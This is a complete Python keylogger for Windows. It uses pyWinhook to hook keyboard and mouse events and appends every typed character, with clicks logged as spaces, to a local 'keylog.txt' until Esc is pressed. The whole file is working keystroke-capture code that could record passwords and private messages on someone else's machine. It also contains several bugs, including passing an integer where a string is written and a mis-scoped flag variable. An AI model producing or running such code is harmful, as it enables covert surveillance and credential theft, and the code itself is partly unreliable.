from os import system, name, path, SEEK_END
import pyWinhook
import pythoncom


LOG_FILE = "keylog.txt"
IS_BREAK_ON = True
BREAK_KEY = 27 # ascii 27 is 'esc'

global lClick
lClick = False


def get_path():
    full_path = path.realpath(__file__)
    dirname, file = path.split(full_path)
    return dirname


def write_char(key, fin):
    try:
        with open(get_path() +'\\'+ fin, 'a+') as f:
            f.write(chr(key))
            f.close()
    except Exception or TypeError as e:
        print("Error: {0}".format(e))
        exit(1)

# cheap way to handle special characters
def write_special(s_key, fin):
    global lClick
    lClick = True
    try:
        with open(get_path() +'\\'+ fin, 'a+') as f:
            f.write(s_key)
            f.close()
    except Exception or TypeError as e:
        print("Error: {0}".format(e))
        exit(1)


def backspace(fin):
    # Useful if one wants to use the keylogger for char history
    try:
        with open(get_path() +'\\'+ fin, 'rb+') as f:
            f.seek(-1, SEEK_END)
            f.truncate()
        f.close()
    except Exception or TypeError as e:
        print("Error: {0}".format(e))
        exit(1)



def Keyboard_Event(event):
    key = event.Ascii
    try:
        if key == 5: # Unsure of Ascii '5'
            pass
        elif key == BREAK_KEY:
            if IS_BREAK_ON == True:
                hooker.UnhookKeyboard()
                exit(1)
            else:
                pass
        elif key == 0:
            pass
        elif key == 8:
            write_special("BS", LOG_FILE)
        elif key == 13: # newline
            write_special("\n", LOG_FILE)
        elif key < 32:
            write_special(key, LOG_FILE)
        else:
            write_char(key, LOG_FILE)
    except Exception or TypeError as e:
        print("Error: {0}".format(e))
        exit(1)
    lClick = False

    return True


def Mouse_Event(event):
    # Click Event only makes a space if it is post typing
    global lClick
    if lClick ==False:
        key = " "
        write_special(key, LOG_FILE)
    lClick = True

    return True






if __name__ == '__main__':
    print("start....'esc' to exit")
    hooker = pyWinhook.HookManager()
    hooker.HookKeyboard()
    hooker.KeyDown = Keyboard_Event

    hooker.HookMouse()
    hooker.MouseLeftUp = Mouse_Event
    # Eternal wait -barring break key
    pythoncom.PumpMessages()
